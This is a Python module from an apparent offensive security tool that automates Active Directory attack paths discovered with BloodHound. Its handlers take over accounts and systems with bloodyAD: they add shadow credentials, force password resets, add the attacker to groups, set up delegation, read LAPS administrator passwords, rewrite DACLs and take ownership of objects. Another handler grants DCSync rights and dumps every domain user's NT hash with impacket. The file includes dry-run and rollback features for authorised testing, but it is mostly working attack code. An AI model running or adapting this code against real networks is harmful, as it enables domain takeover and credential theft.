"""ACL-based exploitation handlers for BloodHound edges.

Handles GenericAll, GenericWrite, WriteDacl, WriteOwner, Owns, and
AllExtendedRights edges.  Each handler uses bloodyAD for AD object
manipulation and records rollback actions where the change is reversible.
"""

from __future__ import annotations

import secrets
import string

from pathstrike.config import PathStrikeConfig
from pathstrike.engine.credential_store import CredentialStore
from pathstrike.engine.edge_registry import register_handler
from pathstrike.handlers.base import BaseEdgeHandler
from pathstrike.models import (
    Credential,
    CredentialType,
    EdgeInfo,
    RollbackAction,
)
from pathstrike.tools import bloodyad_wrapper as bloody


def _generate_password(length: int = 20) -> str:
    """Generate a cryptographically random password."""
    alphabet = string.ascii_letters + string.digits + "!@#$%&*"
    return "".join(secrets.choice(alphabet) for _ in range(length))


# ======================================================================
# GenericAll / GenericWrite
# ======================================================================


@register_handler("GenericAll", "GenericWrite")
class GenericAllHandler(BaseEdgeHandler):
    """Handles GenericAll and GenericWrite edges.

    The exploitation strategy depends on the target object type:

    * **User** -- shadow credentials via ``addKeyCredentialLink``, with
      fallback to force password change.
    * **Group** -- add the controlled principal as a member.
    * **Computer** -- configure Resource-Based Constrained Delegation (RBCD).
    * **Domain** -- grant DCSync replication rights.
    """

    def __init__(self, config: PathStrikeConfig, credential_store: CredentialStore) -> None:
        super().__init__(config, credential_store)
        # Tracks which fallback strategy actually succeeded for multi-strategy
        # target types (currently Computer).  Consulted by get_rollback_action
        # so the rollback entry matches what was done at runtime.
        self._successful_strategy: str | None = None

    async def check_prerequisites(self, edge: EdgeInfo) -> tuple[bool, str]:
        target_type = edge.target.label.lower()
        supported = {"user", "group", "computer", "domain"}
        if target_type not in supported:
            return False, f"Unsupported target type for GenericAll: {edge.target.label}"
        return True, f"GenericAll on {edge.target.label} target is supported"

    async def exploit(
        self, edge: EdgeInfo, dry_run: bool = False
    ) -> tuple[bool, str, list[Credential]]:
        principal = self._resolve_principal(edge)
        target = self._resolve_target(edge)
        auth_args = self._get_auth_args(principal)
        new_creds: list[Credential] = []

        match edge.target.label.lower():
            # ----- User target: shadow credentials or password reset -----
            case "user":
                if dry_run:
                    return True, f"[DRY RUN] Would add shadow credential to {target}", []

                self.logger.info("Attempting shadow credentials on user %s", target)
                result = await bloody.add_key_credential(self.config, auth_args, target)

                if result["success"]:
                    # bloodyAD outputs certificate info on success
                    cert_path = result.get("output", "")
                    new_creds.append(
                        Credential(
                            cred_type=CredentialType.certificate,
                            value=cert_path,
                            username=target,
                            domain=self._get_domain(),
                            obtained_from=f"GenericAll shadow creds on {target}",
                        )
                    )
                    return True, f"Shadow credential added to {target}", new_creds

                # Fallback: force password change
                self.logger.warning(
                    "Shadow creds failed for %s, falling back to password change", target
                )
                new_pass = _generate_password()
                result = await bloody.set_password(self.config, auth_args, target, new_pass)
                if not result["success"]:
                    return False, f"Failed to change password for {target}: {result.get('error', 'unknown')}", []

                new_creds.append(
                    Credential(
                        cred_type=CredentialType.password,
                        value=new_pass,
                        username=target,
                        domain=self._get_domain(),
                        obtained_from=f"GenericAll password reset on {target}",
                    )
                )
                return True, f"Password changed for {target}", new_creds

            # ----- Group target: add self as member -----
            case "group":
                if dry_run:
                    return True, f"[DRY RUN] Would add {principal} to group {target}", []

                self.logger.info("Adding %s to group %s", principal, target)
                result = await bloody.add_to_group(self.config, auth_args, principal, target)
                if not result["success"]:
                    return False, f"Failed to add {principal} to {target}: {result.get('error', 'unknown')}", []
                return True, f"Added {principal} to group {target}", []

            # ----- Computer target: Shadow Creds → RBCD → LAPS → PwReset -----
            case "computer":
                if dry_run:
                    return (
                        True,
                        f"[DRY RUN] Would try Shadow Creds → RBCD → LAPS → "
                        f"password reset on computer {target}",
                        [],
                    )
                return await self._exploit_computer_ladder(
                    edge, target, principal, auth_args,
                )

            # ----- Domain target: grant DCSync rights -----
            case "domain":
                if dry_run:
                    return True, f"[DRY RUN] Would grant DCSync rights to {principal} on {target}", []

                self.logger.info("Granting DCSync rights to %s", principal)
                result = await bloody.grant_dcsync_rights(self.config, auth_args, principal)
                if not result["success"]:
                    return False, f"Failed to grant DCSync: {result.get('error', 'unknown')}", []
                return True, f"DCSync rights granted to {principal}", []

            case _:
                return False, f"Unsupported target type: {edge.target.label}", []

    async def _exploit_computer_ladder(
        self,
        edge: EdgeInfo,
        target: str,
        principal: str,
        auth_args: list[str],
    ) -> tuple[bool, str, list[Credential]]:
        """Try Computer-target exploits in order, stopping at first success.

        Order (least → most disruptive):
            1. Shadow Credentials — AddKeyCredentialLink; PKINIT yields the
               machine's NT hash.  Non-disruptive, chainable.
            2. RBCD — msDS-AllowedToActOnBehalfOfOtherIdentity; S4U2Self /
               S4U2Proxy impersonates any user on the target.
            3. LAPS Read — returns ``ms-Mcs-AdmPwd`` / ``msLAPS-Password``
               if the attacker has read rights on the attribute.  Harvests
               the local Administrator password.
            4. Force machine password reset — disruptive (service/user
               logons on the machine may break until AD re-syncs).

        Every attempted strategy is logged.  The successful strategy name
        is stashed on ``self._successful_strategy`` so that
        :meth:`get_rollback_action` can return a rollback entry that
        matches what actually happened.
        """
        new_creds: list[Credential] = []
        strategy_errors: list[str] = []

        # -------- Strategy 1: Shadow Credentials on the computer ----------
        self.logger.info(
            "[Strategy 1/4] Shadow Credentials on computer %s", target,
        )
        result = await bloody.add_shadow_credentials(self.config, auth_args, target)
        if result["success"]:
            self._successful_strategy = "shadow_creds"
            cert_path = result.get("output", "")
            new_creds.append(
                Credential(
                    cred_type=CredentialType.certificate,
                    value=cert_path,
                    username=target,
                    domain=self._get_domain(),
                    obtained_from=f"Shadow creds on computer {target}",
                )
            )
            return True, f"Shadow credential added to computer {target}", new_creds
        err = result.get("error", "unknown")
        strategy_errors.append(f"Shadow Creds: {err}")
        self.logger.warning("Shadow Creds failed on %s: %s", target, err)

        # -------- Strategy 2: RBCD -----------------------------------------
        self.logger.info(
            "[Strategy 2/4] RBCD configuration on %s (trustee=%s)",
            target, principal,
        )
        result = await bloody.set_rbcd(self.config, auth_args, target, principal)
        if result["success"]:
            self._successful_strategy = "rbcd"
            return (
                True,
                f"RBCD configured on {target} (S4U2Proxy via {principal} → any user)",
                [],
            )
        err = result.get("error", "unknown")
        strategy_errors.append(f"RBCD: {err}")
        self.logger.warning("RBCD failed on %s: %s", target, err)

        # -------- Strategy 3: LAPS Read ------------------------------------
        self.logger.info("[Strategy 3/4] LAPS password read on %s", target)
        result = await bloody.read_laps(self.config, auth_args, target)
        if result["success"]:
            laps_pwd = self._extract_laps_password(result)
            if laps_pwd:
                self._successful_strategy = "laps"
                new_creds.append(
                    Credential(
                        cred_type=CredentialType.password,
                        value=laps_pwd,
                        username="Administrator",
                        domain=target,  # local scope, not AD domain
                        obtained_from=f"LAPS read on {target}",
                    )
                )
                return (
                    True,
                    f"LAPS password read from {target} (local Administrator)",
                    new_creds,
                )
            strategy_errors.append("LAPS: attribute empty or encrypted")
            self.logger.warning(
                "LAPS read succeeded but no plaintext password in output on %s "
                "(attribute may be empty, encrypted, or not set)", target,
            )
        else:
            err = result.get("error", "unknown")
            strategy_errors.append(f"LAPS: {err}")
            self.logger.warning("LAPS read failed on %s: %s", target, err)

        # -------- Strategy 4: Force machine password reset -----------------
        self.logger.info(
            "[Strategy 4/4] Force machine password reset on %s (disruptive)",
            target,
        )
        new_pass = _generate_password()
        sam = target if target.endswith("$") else f"{target}$"
        result = await bloody.set_password(self.config, auth_args, sam, new_pass)
        if result["success"]:
            self._successful_strategy = "password_reset"
            new_creds.append(
                Credential(
                    cred_type=CredentialType.password,
                    value=new_pass,
                    username=sam,
                    domain=self._get_domain(),
                    obtained_from=f"Machine password reset on {target}",
                )
            )
            return True, f"Machine password reset for {target}", new_creds
        err = result.get("error", "unknown")
        strategy_errors.append(f"Password Reset: {err}")
        self.logger.warning("Machine password reset failed on %s: %s", target, err)

        # -------- All strategies exhausted ---------------------------------
        combined = "; ".join(strategy_errors)
        return (
            False,
            f"All 4 computer-target strategies failed on {target}: {combined}",
            [],
        )

    def _extract_laps_password(self, result: dict) -> str | None:
        """Extract the plaintext LAPS password from a bloodyAD read result.

        Handles both legacy LAPS (``ms-Mcs-AdmPwd``) and modern Windows
        LAPS (``msLAPS-Password`` JSON blob: ``{"n": "Administrator",
        "p": "<plaintext>"}``).  Returns ``None`` if no plaintext is
        present — e.g. for Windows LAPS with encrypted passwords (DPAPI-NG),
        which this tool does not decrypt.
        """
        parsed = result.get("parsed")
        output = result.get("output", "") or ""

        # Legacy LAPS — attribute value is the plaintext password directly.
        if isinstance(parsed, dict):
            for k, v in parsed.items():
                if not isinstance(v, str):
                    continue
                key_lower = k.lower()
                if key_lower in {"ms-mcs-admpwd"}:
                    return v.strip() or None
                if key_lower in {"mslaps-password"}:
                    # Windows LAPS: value is either JSON string or raw password.
                    stripped = v.strip()
                    if stripped.startswith("{"):
                        try:
                            import json as _json
                            blob = _json.loads(stripped)
                            pwd = blob.get("p")
                            if isinstance(pwd, str) and pwd:
                                return pwd
                        except (ValueError, TypeError):
                            pass
                    elif stripped:
                        return stripped

        # Fallback: scan text output for recognisable keys.
        for line in output.splitlines():
            if ":" not in line:
                continue
            key, _, val = line.partition(":")
            key_lower = key.strip().lower()
            val = val.strip()
            if key_lower == "ms-mcs-admpwd" and val:
                return val
            if key_lower == "mslaps-password" and val:
                if val.startswith("{"):
                    try:
                        import json as _json
                        blob = _json.loads(val)
                        pwd = blob.get("p")
                        if isinstance(pwd, str) and pwd:
                            return pwd
                    except (ValueError, TypeError):
                        continue
                else:
                    return val

        return None

    def get_rollback_action(self, edge: EdgeInfo) -> RollbackAction | None:
        principal = self._resolve_principal(edge)
        target = self._resolve_target(edge)

        match edge.target.label.lower():
            case "user":
                # Shadow creds: could remove KeyCredentialLink; password change is not reversible
                return RollbackAction(
                    step_index=0,
                    action_type="remove_key_credential",
                    description=f"Remove shadow credential from {target}",
                    command=f"bloodyAD remove shadowCredentials {target}",
                    reversible=True,
                )
            case "group":
                return RollbackAction(
                    step_index=0,
                    action_type="remove_group_member",
                    description=f"Remove {principal} from group {target}",
                    command=f"bloodyAD remove groupMember {target} {principal}",
                    reversible=True,
                )
            case "computer":
                # Rollback depends on which strategy actually succeeded at
                # runtime (tracked on self._successful_strategy by the ladder).
                strategy = self._successful_strategy
                if strategy == "shadow_creds":
                    return RollbackAction(
                        step_index=0,
                        action_type="remove_key_credential",
                        description=f"Remove shadow credential from computer {target}",
                        command=f"bloodyAD remove shadowCredentials {target}",
                        reversible=True,
                    )
                if strategy == "rbcd":
                    return RollbackAction(
                        step_index=0,
                        action_type="remove_rbcd",
                        description=f"Remove RBCD delegation on {target}",
                        command=f"bloodyAD remove rbcd {target} {principal}",
                        reversible=True,
                    )
                if strategy == "laps":
                    # LAPS read is pure enumeration — nothing was written.
                    return None
                if strategy == "password_reset":
                    # Machine password reset is not reliably reversible
                    # without the prior hash.  Record an informational entry.
                    sam = target if target.endswith("$") else f"{target}$"
                    return RollbackAction(
                        step_index=0,
                        action_type="machine_password_reset_manual",
                        description=(
                            f"Machine password reset on {sam} — cannot be "
                            f"auto-reverted.  AD will eventually replace it "
                            f"via the secure channel, but service logons may "
                            f"break until then."
                        ),
                        command=f"# manual cleanup required for {sam}",
                        reversible=False,
                    )
                # Fallback (pre-execution planning or all strategies failed)
                return RollbackAction(
                    step_index=0,
                    action_type="remove_rbcd",
                    description=f"Remove RBCD delegation on {target} (if set)",
                    command=f"bloodyAD remove rbcd {target} {principal}",
                    reversible=True,
                )
            case "domain":
                return RollbackAction(
                    step_index=0,
                    action_type="remove_dcsync",
                    description=f"Remove DCSync rights for {principal}",
                    command=f"bloodyAD remove dcsync {principal}",
                    reversible=True,
                )
            case _:
                return None


# ======================================================================
# WriteDacl
# ======================================================================


@register_handler("WriteDacl")
class WriteDaclHandler(BaseEdgeHandler):
    """Handles WriteDacl edges.

    Grants the controlled principal GenericAll on the target object by
    modifying the target's DACL via bloodyAD.
    """

    async def check_prerequisites(self, edge: EdgeInfo) -> tuple[bool, str]:
        return True, "WriteDacl allows DACL modification on target"

    async def exploit(
        self, edge: EdgeInfo, dry_run: bool = False
    ) -> tuple[bool, str, list[Credential]]:
        principal = self._resolve_principal(edge)
        target = self._resolve_target(edge)
        auth_args = self._get_auth_args(principal)

        if dry_run:
            return True, f"[DRY RUN] Would grant GenericAll to {principal} on {target} via DACL", []

        self.logger.info("Modifying DACL: granting GenericAll to %s on %s", principal, target)
        result = await bloody.modify_dacl(
            self.config, auth_args, target, principal, "GenericAll"
        )
        if not result["success"]:
            return False, f"WriteDacl failed on {target}: {result.get('error', 'unknown')}", []
        return True, f"GenericAll granted to {principal} on {target} via DACL modification", []

    def get_rollback_action(self, edge: EdgeInfo) -> RollbackAction | None:
        principal = self._resolve_principal(edge)
        target = self._resolve_target(edge)
        return RollbackAction(
            step_index=0,
            action_type="remove_dacl_ace",
            description=f"Remove GenericAll ACE for {principal} on {target}",
            command=f"bloodyAD remove dacl {target} {principal} GenericAll",
            reversible=True,
        )


# ======================================================================
# WriteOwner
# ======================================================================


@register_handler("WriteOwner", "WriteOwnerRaw")
class WriteOwnerHandler(BaseEdgeHandler):
    """Handles WriteOwner edges.

    Takes ownership of the target object and modifies the DACL to grant
    GenericAll (since the owner can always modify the DACL).  When the
    target is a Group, *also* adds the principal as a member so that the
    group's outbound ACL edges (GenericWrite on users, GenericAll on
    computers, etc.) flow to the principal via MemberOf for subsequent
    chained steps in the attack path.
    """

    async def check_prerequisites(self, edge: EdgeInfo) -> tuple[bool, str]:
        return True, "WriteOwner allows taking ownership of the target"

    async def exploit(
        self, edge: EdgeInfo, dry_run: bool = False
    ) -> tuple[bool, str, list[Credential]]:
        principal = self._resolve_principal(edge)
        target = self._resolve_target(edge)
        auth_args = self._get_auth_args(principal)

        # GPOs / OUs / Containers need DN-based resolution
        if self._target_needs_dn(edge):
            dn = await self._resolve_target_dn(edge, auth_args)
            if dn:
                target = dn
            else:
                return False, f"Could not resolve DN for {edge.target.name} via LDAP", []

        target_is_group = edge.target.label.lower() == "group"

        if dry_run:
            action_desc = (
                f"[DRY RUN] Would take ownership of {target}, grant GenericAll to "
                f"{principal}, and add {principal} as a member of {target}"
                if target_is_group
                else f"[DRY RUN] Would take ownership of {target} and grant GenericAll to {principal}"
            )
            return True, action_desc, []

        # Step 1: Take ownership
        self.logger.info("Taking ownership of %s as %s", target, principal)
        result = await bloody.set_owner(self.config, auth_args, target, principal)
        if not result["success"]:
            return False, f"Failed to take ownership of {target}: {result.get('error', 'unknown')}", []

        # Step 2: Grant GenericAll via DACL (we are now the owner)
        self.logger.info("Granting GenericAll to %s on %s via DACL", principal, target)
        result = await bloody.modify_dacl(
            self.config, auth_args, target, principal, "GenericAll"
        )
        if not result["success"]:
            return (
                False,
                f"Took ownership but failed to modify DACL on {target}: {result.get('error', 'unknown')}",
                [],
            )

        # Step 3 (Group targets only): add principal as member so that the
        # group's outbound ACL edges propagate through MemberOf in subsequent
        # chained steps.  Without this, Judith owns MANAGEMENT but isn't a
        # member, so MANAGEMENT's GenericWrite on management_svc is never
        # reachable when authenticating as Judith.
        if target_is_group:
            self.logger.info(
                "Adding %s as member of %s so group-inherited rights propagate",
                principal, target,
            )
            result = await bloody.add_to_group(
                self.config, auth_args, principal, target,
            )
            if not result["success"]:
                # Don't fail the whole step — ownership + GenericAll still
                # useful on their own, and the user can add themselves
                # manually.  Just flag it in the result message.
                self.logger.warning(
                    "Failed to add %s to %s after taking ownership: %s",
                    principal, target, result.get("error", "unknown"),
                )
                return (
                    True,
                    (
                        f"Took ownership of {target} and granted GenericAll to "
                        f"{principal}; could NOT add as member — subsequent "
                        f"chained steps via this group may fail: "
                        f"{result.get('error', 'unknown')}"
                    ),
                    [],
                )
            return (
                True,
                (
                    f"Took ownership of {target}, granted GenericAll, and added "
                    f"{principal} as member (group rights now propagate)"
                ),
                [],
            )

        return True, f"Took ownership of {target} and granted GenericAll to {principal}", []

    def get_rollback_action(self, edge: EdgeInfo) -> RollbackAction | None:
        principal = self._resolve_principal(edge)
        target = self._resolve_target(edge)
        target_is_group = edge.target.label.lower() == "group"

        if target_is_group:
            return RollbackAction(
                step_index=0,
                action_type="remove_dacl_ace_and_group_member",
                description=(
                    f"Remove {principal} from group {target} and remove "
                    f"GenericAll ACE (note: original owner NOT restored)"
                ),
                command=(
                    f"bloodyAD remove groupMember {target} {principal}; "
                    f"bloodyAD remove dacl {target} {principal} GenericAll"
                ),
                reversible=True,
            )

        # Ownership changes on non-group targets are difficult to reverse
        # without knowing the original owner.  We record the DACL cleanup
        # at minimum.
        return RollbackAction(
            step_index=0,
            action_type="remove_dacl_ace",
            description=(
                f"Remove GenericAll ACE for {principal} on {target} "
                f"(note: original owner NOT restored)"
            ),
            command=f"bloodyAD remove dacl {target} {principal} GenericAll",
            reversible=True,
        )


# ======================================================================
# Owns
# ======================================================================


@register_handler("Owns", "OwnsRaw")
class OwnsHandler(BaseEdgeHandler):
    """Handles Owns edges.

    The principal already owns the target object, so we can modify the
    DACL directly to grant GenericAll.
    """

    async def check_prerequisites(self, edge: EdgeInfo) -> tuple[bool, str]:
        return True, "Principal already owns the target; DACL modification permitted"

    async def exploit(
        self, edge: EdgeInfo, dry_run: bool = False
    ) -> tuple[bool, str, list[Credential]]:
        principal = self._resolve_principal(edge)
        target = self._resolve_target(edge)
        auth_args = self._get_auth_args(principal)

        if dry_run:
            return True, f"[DRY RUN] Would grant GenericAll to {principal} on {target} (owner)", []

        self.logger.info(
            "Owner %s granting GenericAll on %s via DACL", principal, target
        )
        result = await bloody.modify_dacl(
            self.config, auth_args, target, principal, "GenericAll"
        )
        if not result["success"]:
            return False, f"DACL modification failed on {target}: {result.get('error', 'unknown')}", []

        return True, f"GenericAll granted to {principal} on {target} (owner privilege)", []

    def get_rollback_action(self, edge: EdgeInfo) -> RollbackAction | None:
        principal = self._resolve_principal(edge)
        target = self._resolve_target(edge)
        return RollbackAction(
            step_index=0,
            action_type="remove_dacl_ace",
            description=f"Remove GenericAll ACE for {principal} on {target}",
            command=f"bloodyAD remove dacl {target} {principal} GenericAll",
            reversible=True,
        )


# ======================================================================
# AllExtendedRights
# ======================================================================


@register_handler("AllExtendedRights")
class AllExtendedRightsHandler(BaseEdgeHandler):
    """Handles AllExtendedRights edges.

    * **On User targets** -- force password change.
    * **On Domain targets** -- DCSync (DS-Replication-Get-Changes + -All).
    """

    async def check_prerequisites(self, edge: EdgeInfo) -> tuple[bool, str]:
        target_type = edge.target.label.lower()
        if target_type in {"user", "domain"}:
            return True, f"AllExtendedRights on {edge.target.label} is exploitable"
        return False, f"AllExtendedRights on {edge.target.label} has no automated exploit"

    async def exploit(
        self, edge: EdgeInfo, dry_run: bool = False
    ) -> tuple[bool, str, list[Credential]]:
        principal = self._resolve_principal(edge)
        target = self._resolve_target(edge)
        auth_args = self._get_auth_args(principal)
        new_creds: list[Credential] = []

        match edge.target.label.lower():
            case "user":
                if dry_run:
                    return True, f"[DRY RUN] Would force password change on {target}", []

                new_pass = _generate_password()
                self.logger.info("Force-changing password for %s", target)
                result = await bloody.set_password(self.config, auth_args, target, new_pass)
                if not result["success"]:
                    return (
                        False,
                        f"Password change failed for {target}: {result.get('error', 'unknown')}",
                        [],
                    )

                new_creds.append(
                    Credential(
                        cred_type=CredentialType.password,
                        value=new_pass,
                        username=target,
                        domain=self._get_domain(),
                        obtained_from=f"AllExtendedRights password reset on {target}",
                    )
                )
                return True, f"Password changed for {target}", new_creds

            case "domain":
                if dry_run:
                    return (
                        True,
                        f"[DRY RUN] Would perform DCSync via AllExtendedRights as {principal}",
                        [],
                    )

                from pathstrike.tools import impacket_wrapper as impacket

                self.logger.info("Performing DCSync as %s", principal)
                target_str, impacket_auth = self._get_impacket_auth(principal)
                result = await impacket.secretsdump(
                    target=self._get_dc_host(),
                    auth_args=impacket_auth,
                    domain=self._get_domain(),
                    username=principal,
                    dc_ip=self._get_dc_host(),
                    just_dc=True,
                )
                if not result["success"]:
                    return False, f"DCSync failed: {result.get('error', 'unknown')}", []

                hashes = result.get("hashes", {})
                for user, nt_hash in hashes.items():
                    new_creds.append(
                        Credential(
                            cred_type=CredentialType.nt_hash,
                            value=nt_hash,
                            username=user,
                            domain=self._get_domain(),
                            obtained_from="DCSync via AllExtendedRights",
                        )
                    )
                return True, f"DCSync complete, extracted {len(hashes)} hashes", new_creds

            case _:
                return False, f"AllExtendedRights on {edge.target.label} not implemented", []

    def get_rollback_action(self, edge: EdgeInfo) -> RollbackAction | None:
        # Password changes are not reversible (original unknown).
        # DCSync is read-only.
        return None
